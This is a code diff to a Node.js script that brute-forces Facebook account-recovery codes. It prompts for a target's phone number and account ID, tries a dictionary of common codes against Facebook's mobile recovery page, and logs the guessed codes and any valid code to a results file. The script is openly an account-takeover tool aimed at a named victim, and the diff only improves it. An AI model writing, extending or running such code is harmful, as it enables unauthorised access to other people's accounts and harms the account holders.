@@ -1,5 +1,6 @@
 const readlineSync = require('readline-sync');
 const axios = require('axios');
+const fs = require('fs'); // A module that allows you to work with files
 
 // A dictionary of common codes
 const dictionary = ["1234", "0000", "1111", "4321", "5555", "9999", "12345678", "87654321"];
@@ -52,17 +53,29 @@ async function bruteForceCode() {
         if (validCode) {
             return validCode;
         }
+        // Log the codes and the results to the console
+        console.log(`Generated codes: ${codes.join(", ")}`);
+        console.log(`None of them is valid.`);
+        // Append the codes and the results to a file
+        fs.appendFile("results.txt", `Generated codes: ${codes.join(", ")}\nNone of them is valid.\n`, (err) => {
+            if (err) throw err;
+        });
     }
 }
 
 // Example usage:
 const targetInfo = readlineSync.question("Enter the target's phone number and account ID separated by a comma: ");
-const targetUrl = "https://www.facebook.com/login/identify/?ctx=recover&from_login_screen=0";
+const targetUrl = "https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&wtsid=rdr_1q6Vogj2mr2kpMQG9&_rdr";
 
 try {
     bruteForceCode().then(validCode => {
         console.log(`The valid code on the specified page is: ${validCode}`);
+        // Append the valid code to the file
+        fs.appendFile("results.txt", `The valid code on the specified page is: ${validCode}\n`, (err) => {
+            if (err) throw err;
+        });
     });
 } catch (error) {
     console.error(`Error: ${error.message}`);
 }
+
